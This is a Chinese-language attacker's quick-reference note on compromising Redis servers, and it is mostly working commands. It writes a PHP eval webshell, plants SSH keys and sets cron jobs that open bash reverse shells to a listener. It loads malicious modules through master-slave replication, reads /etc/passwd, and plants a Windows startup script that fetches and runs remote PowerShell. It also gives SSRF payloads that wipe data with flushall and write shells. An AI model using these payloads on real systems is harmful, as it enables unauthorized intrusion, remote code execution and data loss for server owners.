# Redis

更新时间：2022.2.12

老鸟速查笔记，新手建议直接读文末引用。





# GetShell



### 写webshell

- 已知web的绝对路径

- 对应目录具有读写权限



```
redis-cli -h 192.168.1.154
config set dir /var/www/html 
set xxx "\n\n\n<?php@eval($_POST['c']);?>\n\n\n" 
config set dbfilename webshell.php 
save
```



### 写入ssh公钥getshell

- redis服务为root权限
- 允许密钥登录
- linux

```
config set dir /root/.ssh
config set dbfilename authorized_keys
set xxssh "\n\nssh-rsa xxxxxx\n\n"
save
```



### 计划任务反弹shell

- redis服务为root权限启动

```bash
config set dir /var/spool/cron/
config set dbfilename root
set xxx "\n\n\n* * * * * bash -i >&/dev/tcp/ip/端口 0>&1\n\n\n"
save
```



tips:**crontab反弹debian,ubuntu都不行**，因为他们对计划任务的格式很严格，必须要执行 `crontab -u root /var/spool/cron/crontabs/root` 通过语法检查后，才能执行计划任务。    

最后补充一下，可进行利用的cron有如下几个地方：

- /etc/crontab 这个是肯定的
- /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。
- /var/spool/cron/root centos系统下root用户的cron文件
- /var/spool/cron/crontabs/root debian系统下root用户的cron文件



### 主从rce

- redis服务为root权限启动
- redis 4.x/5.x

本质上就是加载一个so文件，用来执行命令。和udf差不多。如果本身就可以上传文件的情况下，直接上传so文件加载即可，不用利用主从。主从的意思就是把当前redis设置为备份库，等着把恶意的远程db备份过来，进行加载。

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand/
make

```

开启恶意redis一键rce

```
git clone https://github.com/Ridter/redis-rce
python redis-rce.py -r 192.168.1.154 -L 192.168.1.153 -f module.so
python redis-rce.py -r 10.10.30.171 -p 44711 -L 10.10.30.171 -L 12138 -f exp.so -v
```

```
https://github.com/vulhub/redis-rogue-getshell
需要python3.0以上
编译
>cd RedisModulesSDK/
>make
会在此目录下生成exp.so
执行命令
>python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c "cat /etc/passwd"
```

```


https://github.com/n0b0dyCN/redis-rogue-server.git

python3 redis-rogue-server.py --rhost 10.10.30.171 --rport 8407 --lhost 10.10.30.171 --lport 1218 
```


#### 手动操作
redis加载远程exp.so命令执行,配合被动连接使用   

https://github.com/Dliv3/redis-rogue-server

```
#设置redis的备份路径为当前目录(注意目录权限问题)
    config set dir ./
#设置备份文件名为exp.so，默认为dump.rdb
    config set dbfilename exp.so
#设置主服务器IP和端口
    slaveof 192.168.172.129 21000  
#加载恶意模块
    module load ./exp.so
#切断主从，关闭复制功能
    slaveof no one 
#执行系统命令
    system.exec 'whoami'
```




还可以写无损文件

https://github.com/r35tart/RedisWriteFile



还可以主从复制覆写shadow





### windows系统主从利用

- 需要启动项目录的写入权限
- 服务器需要重启



```
config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
config set dbfilename shell.bat
set x "\r\n\r\npowershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx.2/shell.ps1');xx.ps1\"\r\n\r\n"
save
```


## win利用dll
https://github.com/learner-ing/redis-rce


# Other

## ssrf 攻击未授权访问redis

```
# 清空 key
dict://172.72.23.27:6379/flushall

# 设置要操作的路径为定时任务目录
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# 在定时任务目录下创建 root 的定时任务文件
dict://172.72.23.27:6379/config set dbfilename root

# 写入 Bash 反弹 shell 的 payload
dict://172.72.23.27:6379/set x "\n* * * * * /bin/bash -i >%26 /dev/tcp/x.x.x.x/2333 0>%261\n"

# 保存上述操作
dict://172.72.23.27:6379/save

```

如果是Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。见ref  



## ssrf 攻击需要验证redis
可以看到每行都是以\r结尾的，但是 Redis 的协议是以 CRLF (\r\n)结尾，所以转换的时候需要把\r转换为\r\n，然后其他全部进行 两次 URL 编码
```
*2\r
$4\r
auth\r
$8\r
P@ssw0rd\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$1\r
x\r
$25\r


\r
*1\r
$4\r
save\r  

```







# References
- https://djhons.com/2021/10/29/61.html
- https://www.anquanke.com/post/id/214108
- https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
- https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-25
